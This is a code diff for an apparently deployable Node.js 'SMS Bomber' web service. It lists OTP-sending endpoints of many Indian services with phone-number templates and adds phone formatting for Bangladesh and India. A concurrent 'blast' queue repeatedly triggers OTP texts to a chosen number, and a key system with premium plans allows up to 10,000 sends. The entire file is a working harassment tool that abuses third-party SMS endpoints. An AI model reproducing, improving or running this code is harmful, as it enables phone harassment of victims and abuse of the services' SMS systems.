   { name: "OYO", method: "POST", url: "https://www.oyorooms.com/api/pwa/generateotp?locale=en", headers: { "Content-Type": "application/json" }, body: '{"phone":"{phone}","country_code":"+91","nod":4}' },
-  { name: "ConfirmTkt", method: "GET", url: "https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={phone}" },
-  { name: "HappyEasyGo", method: "GET", url: "https://m.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phone=91%20{phone}" },
-
   { name: "Unacademy", method: "POST", url: "https://unacademy.com/api/v3/user/user_check/", headers: { "Content-Type": "application/json" }, body: '{"phone":"{phone}","send_otp":true}' },
   { name: "Vedantu", method: "POST", url: "https://user.vedantu.com/user/preLoginVerification", headers: { "Content-Type": "application/json" }, body: '{"phoneNumber":"{phone}","phoneCode":"+91"}' },
   { name: "Byju's", method: "POST", url: "https://bcas-prod.byjusweb.com/api/send-otp", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: 'phoneNumber={phone}', isFormData: true },
   { name: "Doubtnut", method: "POST", url: "https://doubtnut.com/api/v1/user/login", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: 'phone={phone}', isFormData: true },
   { name: "PenPencil", method: "POST", url: "https://api.penpencil.co/v1/users/resend-otp?smsType=1", headers: { "Content-Type": "application/json" }, body: '{"mobile":"{phone}"}' },
   { name: "UpGrad", method: "POST", url: "https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone", headers: { "Content-Type": "application/json" }, body: '{"phoneNumber":"+91{phone}"}' },
-
   { name: "Google Pay", method: "POST", url: "https://pay.google.com/api/otp", headers: { "Content-Type": "application/json" }, body: '{"phoneNumber":"{phone}"}' },
   { name: "Amazon Pay", method: "POST", url: "https://pay.amazon.in/api/otp", headers: { "Content-Type": "application/json" }, body: '{"mobile":"{phone}"}' },
   { name: "Mobikwik", method: "POST", url: "https://www.mobikwik.com/otp", headers: { "Content-Type": "application/json" }, body: '{"mobile":"{phone}"}' },
   { name: "Freecharge", method: "POST", url: "https://www.freecharge.in/api/otp", headers: { "Content-Type": "application/json" }, body: '{"phone":"{phone}"}' },
   { name: "PhonePe", method: "POST", url: "https://www.phonepe.com/api/v2/otp", headers: { "Content-Type": "application/json" }, body: '{"phone":"{phone}"}' },
-
   { name: "NoBroker", method: "POST", url: "https://www.nobroker.in/api/v3/account/otp/send", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: 'phone={phone}&countryCode=IN', isFormData: true },
   { name: "PharmEasy", method: "POST", url: "https://pharmeasy.in/api/v2/auth/send-otp", headers: { "Content-Type": "application/json" }, body: '{"phone":"{phone}"}' },
   { name: "Hungama", method: "POST", url: "https://communication.api.hungama.com/v1/communication/otp", headers: { "Content-Type": "application/json" }, body: '{"mobileNo":"{phone}","countryCode":"+91","appCode":"un"}' },
@@ -327,12 +331,12 @@ const jobs = new JobStore();
 // KEY MANAGER
 // ============================================================
 const PLAN_CONFIG = {
-  default:    { name: 'Default',    maxCount: 300,    requiresKey: false },
-  premium:    { name: 'Premium',    maxCount: 10000,  requiresKey: true  }
+  default: { name: 'Default', maxCount: 300, requiresKey: false },
+  premium: { name: 'Premium', maxCount: 10000, requiresKey: true }
 };
 class KeyManager {
   constructor() {
-    this.file = path.join('/tmp', 'keys.json'); // Vercel safe
+    this.file = path.join('/tmp', 'keys.json');
     this.keys = this.load();
   }
   load() {
@@ -374,14 +378,32 @@ class KeyManager {
 const keys = new KeyManager();
 
 // ============================================================
-// ENGINE (Core Function)
+// ENGINE (Core Function) — Smart Format + Strict Detection
 // ============================================================
-async function callOne(api, phone, jobId) {
+function applyPhoneFormat(template, phone, region) {
+  if (!template) return template;
+  let s = String(template);
+
+  if (region === 'BD') {
+    s = s.replace(/{phone_10}/g, Utility.formatPhone(phone, '10'));
+    s = s.replace(/{phone_0}/g, Utility.formatPhone(phone, '0'));
+    s = s.replace(/{phone_880}/g, Utility.formatPhone(phone, '880'));
+    s = s.replace(/{phone_plus880}/g, Utility.formatPhone(phone, 'plus880'));
+    s = s.replace(/{phone_plus88}/g, Utility.formatPhone(phone, 'plus88'));
+    s = s.replace(/{phone_88dash}/g, Utility.formatPhone(phone, '88dash'));
+    s = s.replace(/{phone}/g, Utility.formatPhone(phone, '880')); // default
+  } else {
+    s = s.replace(/{phone}/g, Utility.formatPhone(phone, '10')); // IN default = 10 digits
+  }
+
+  s = s.replace(/{ts}/g, Date.now());
+  return s;
+}
+
+async function callOne(api, phone, jobId, region) {
   if (!jobs.isActive(jobId)) return { stopped: true };
 
-  // URL ভেরিয়েবল রিপ্লেস
-  let url = api.url.replace(/{phone}/g, phone).replace(/{phone_10}/g, phone.slice(-10)).replace(/{ts}/g, Date.now());
-  
+  let url = applyPhoneFormat(api.url, phone, region);
   let origin = '';
   try { origin = new URL(url).origin; } catch {}
 
@@ -400,18 +422,10 @@ async function callOne(api, phone, jobId) {
     responseType: 'text'
   };
 
-  // Body ভেরিয়েবল রিপ্লেস
-  if (api.method === 'POST' || api.method === 'PUT') {
-    if (api.body) {
-      let dataStr = api.body
-        .replace(/{phone}/g, phone)
-        .replace(/{phone_10}/g, phone.slice(-10))
-        .replace(/{ts}/g, Date.now());
-      
-      cfg.data = dataStr;
-      if (!cfg.headers['Content-Type']) {
-        cfg.headers['Content-Type'] = api.isFormData ? 'application/x-www-form-urlencoded' : 'application/json';
-      }
+  if ((api.method === 'POST' || api.method === 'PUT') && api.body) {
+    cfg.data = applyPhoneFormat(api.body, phone, region);
+    if (!cfg.headers['Content-Type']) {
+      cfg.headers['Content-Type'] = api.isFormData ? 'application/x-www-form-urlencoded' : 'application/json';
     }
   }
 
@@ -421,32 +435,40 @@ async function callOne(api, phone, jobId) {
     status = r.status;
     respBody = typeof r.data === 'string' ? r.data : JSON.stringify(r.data || '');
     const bodyLower = respBody.toLowerCase();
-    
-    // সাকসেস ডিটেকশন (OTP বা Success টেক্সট খুঁজবে)
-    const hasSuccessKeyword =
-      bodyLower.includes('otp') || bodyLower.includes('success') || bodyLower.includes('sent') ||
-      bodyLower.includes('"status":true') || bodyLower.includes('"success":true') || bodyLower.includes('"error":false');
-      
-    ok = (status >= 200 && status < 300) && (hasSuccessKeyword || respBody.length < 80);
-    if (!ok && status >= 200) errMsg = `2xx but no keyword`;
+
+    // Strict success detection
+    const hasError = bodyLower.includes('"error"') || bodyLower.includes('"failed"') ||
+                     bodyLower.includes('"invalid"') || bodyLower.includes('"not found"');
+    const hasSuccess = bodyLower.includes('otp') || bodyLower.includes('success') ||
+                       bodyLower.includes('sent') || bodyLower.includes('"status":true');
+
+    if (status >= 200 && status < 300 && !hasError && (hasSuccess || respBody.length < 50)) {
+      ok = true;
+    } else {
+      if (hasError) errMsg = 'API error keyword';
+      else if (status >= 200 && status < 300) errMsg = `2xx no keyword (${respBody.slice(0, 60)})`;
+      else errMsg = `HTTP ${status}`;
+    }
   } catch (e) {
     status = e.response ? e.response.status : 0;
     errMsg = (e.code || e.message || 'ERR').slice(0, 120);
     ok = false;
   }
+
+  if (!ok) console.log(`[FAIL] ${api.name}: ${errMsg}`);
+  else console.log(`[OK] ${api.name}`);
+
   return { ok, status, error: errMsg };
 }
 
-// Queue Runner (একটার পর একটা রিকোয়েস্ট যাবে)
 async function blast(apis, phone, count, jobId, region) {
   const queue = [];
-  // ইন্ডিয়ান রিকোয়েস্টের জন্য count বাড়ালে ততবার যাবে, BD-এর জন্য ৫ গুণ
   const multiplier = region === 'BD' ? 5 : 1;
   const perApiCount = (parseInt(count) || 1) * multiplier;
 
   for (const api of apis) {
     for (let i = 0; i < perApiCount; i++) {
-      queue.push({ api, phone, jobId });
+      queue.push({ api, phone, jobId, region });
     }
   }
 
@@ -454,24 +476,18 @@ async function blast(apis, phone, count, jobId, region) {
   const CONCURRENCY = CONFIG.performance.concurrency;
   let cursor = 0, fired = 0;
 
-  // Worker Function যা কিউ থেকে ডেটা নিয়ে প্রসেস করবে
   async function worker() {
     while (cursor < queue.length) {
-      if (!jobs.isActive(jobId)) return; // স্টপ কমান্ড দিলে থেমে যাবে
-      
+      if (!jobs.isActive(jobId)) return;
       const idx = cursor++;
       const item = queue[idx];
-      
-      const r = await callOne(item.api, item.phone, item.jobId);
+      const r = await callOne(item.api, item.phone, item.jobId, item.region);
       fired++;
       if (!r.stopped) jobs.bump(jobId, r.ok, r.error);
-      
-      // রিকোয়েস্টের মাঝে ছোট delay (DoS ব্লক এড়ানোর জন্য)
-      await new Promise(res => setTimeout(res, 50));
+      await new Promise(res => setTimeout(res, CONFIG.performance.delayBetweenRequests));
     }
   }
 
-  // কনকারেন্ট ওয়ার্কার চালু করা (একসাথে ৫টি)
   const workers = [];
   for (let i = 0; i < CONCURRENCY; i++) workers.push(worker());
   await Promise.all(workers);
@@ -490,11 +506,11 @@ app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 
 app.get('/', (req, res) => {
-  res.json({ success: true, developer: DEVELOPER_INFO, message: 'SMS Bomber V10.0-TNEH running' });
+  res.json({ success: true, developer: DEVELOPER_INFO, message: 'SMS Bomber V10.1-TNEH running' });
 });
 
 app.get('/api/health', (req, res) => {
-  res.json({ status: 'active', version: "10.0.0-TNEH", bd_apis: BD_APIS.length, india_apis: IN_APIS.length, active_jobs: jobs.active.size });
+  res.json({ status: 'active', version: "10.1.0-TNEH", bd_apis: BD_APIS.length, india_apis: IN_APIS.length, active_jobs: jobs.active.size });
 });
 
 // ---- BD Spam ----
@@ -508,11 +524,8 @@ app.get('/api/spam', async (req, res) => {
     keys.use(key);
   }
   if (!number) return res.status(400).json({ success: false, error: ERROR_MESSAGES.MISSING_PARAM });
-
-  // নম্বর চেক করা (BD এর জন্য)
   if (!Utility.isValidBD(number)) return res.status(400).json({ success: false, error: ERROR_MESSAGES.INVALID_PHONE });
 
-  // নম্বর নরমালাইজ করা: 017... -> 88017...
   const clean = Utility.normalizeBD(number);
   let per = parseInt(count) || 1;
   if (per < 1) per = 1;
@@ -548,11 +561,8 @@ app.get('/api/India', async (req, res) => {
     keys.use(key);
   }
   if (!number) return res.status(400).json({ success: false, error: ERROR_MESSAGES.MISSING_PARAM });
-
-  // নম্বর চেক করা (IN এর জন্য)
   if (!Utility.isValidIN(number)) return res.status(400).json({ success: false, error: ERROR_MESSAGES.INVALID_PHONE });
 
-  // নম্বর নরমালাইজ করা (91... বা 0... বাদ দিয়ে শুধু ১০ ডিজিট)
   const clean = Utility.normalizeIN(number);
   let per = parseInt(count) || 1;
   if (per < 1) per = 1;
@@ -588,11 +598,11 @@ app.get('/api/status', (req, res) => {
 app.use((req, res) => res.status(404).json({ success: false, error: 'Endpoint not found', path: req.path }));
 
 // ============================================================
-// START (Vercel-এর জন্য)
+// START (Vercel-compatible)
 // ============================================================
 if (require.main === module) {
   const server = app.listen(CONFIG.server.port, CONFIG.server.host, () => {
-    console.log(`\n🚀 SMS BOMBER V10.0-TNEH`);
+    console.log(`\n🚀 SMS BOMBER V10.1-TNEH`);
     console.log(`📊 BD: ${BD_APIS.length} | IN: ${IN_APIS.length}`);
     console.log(`⚙️ Concurrency: ${CONFIG.performance.concurrency} (Queue System)\n`);
   });
@@ -601,3 +611,8 @@ if (require.main === module) {
 }
 
 module.exports = app;
+module.exports.app = app;
+module.exports.jobs = jobs;
+module.exports.keys = keys;
+module.exports.BD_APIS = BD_APIS;
+module.exports.IN_APIS = IN_APIS;
